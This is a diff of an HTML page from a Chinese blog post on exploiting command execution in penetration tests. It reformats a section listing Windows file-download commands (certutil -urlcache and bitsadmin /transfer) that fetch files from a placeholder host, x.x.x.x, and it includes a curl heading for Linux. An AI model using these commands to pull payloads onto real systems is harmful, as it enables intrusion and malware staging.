@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="命令下载windows certutil 1certutil -urlcache -split -f http://x.x.x.x/x.txt  bitsadmin 1234bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt//bitsadmin默认较慢，可以使用下面命令提速start bitsadmin /transfer n http://x">
+<meta name="description" content="命令下载windows certutil  1certutil -urlcache -split -f http://x.x.x.x/x.txt  bitsadmin  1234bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt//bitsadmin默认较慢，可以使用下面命令提速start bitsadmin /transfer n http:/">
 <meta name="keywords" content="渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透测试中的命令执行利用">
 <meta property="og:url" content="http://yoursite.com/2018/01/20/渗透测试中的命令执行利用/index.html">
 <meta property="og:site_name" content="哇，博客">
-<meta property="og:description" content="命令下载windows certutil 1certutil -urlcache -split -f http://x.x.x.x/x.txt  bitsadmin 1234bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt//bitsadmin默认较慢，可以使用下面命令提速start bitsadmin /transfer n http://x">
+<meta property="og:description" content="命令下载windows certutil  1certutil -urlcache -split -f http://x.x.x.x/x.txt  bitsadmin  1234bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt//bitsadmin默认较慢，可以使用下面命令提速start bitsadmin /transfer n http:/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-20T15:30:56.470Z">
+<meta property="og:updated_time" content="2018-01-20T16:10:06.572Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透测试中的命令执行利用">
-<meta name="twitter:description" content="命令下载windows certutil 1certutil -urlcache -split -f http://x.x.x.x/x.txt  bitsadmin 1234bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt//bitsadmin默认较慢，可以使用下面命令提速start bitsadmin /transfer n http://x">
+<meta name="twitter:description" content="命令下载windows certutil  1certutil -urlcache -split -f http://x.x.x.x/x.txt  bitsadmin  1234bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt//bitsadmin默认较慢，可以使用下面命令提速start bitsadmin /transfer n http:/">
 
 
 
@@ -372,13 +372,13 @@
 
       
         <h1 id="命令下载"><a href="#命令下载" class="headerlink" title="命令下载"></a>命令下载</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><ul>
-<li><p>certutil</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://x.x.x.x/x.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>bitsadmin</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt</span><br><span class="line">//bitsadmin默认较慢，可以使用下面命令提速</span><br><span class="line">start bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt</span><br><span class="line">bitsadmin /setpriority n foreground</span><br></pre></td></tr></table></figure>
-</li>
+<li>certutil</li>
 </ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://x.x.x.x/x.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li>bitsadmin</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt</span><br><span class="line">//bitsadmin默认较慢，可以使用下面命令提速</span><br><span class="line">start bitsadmin /transfer n http://x.x.x.x/x.txt c:\x.txt</span><br><span class="line">bitsadmin /setpriority n foreground</span><br></pre></td></tr></table></figure>
 <h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ul>
 <li>curl</li>
 </ul>
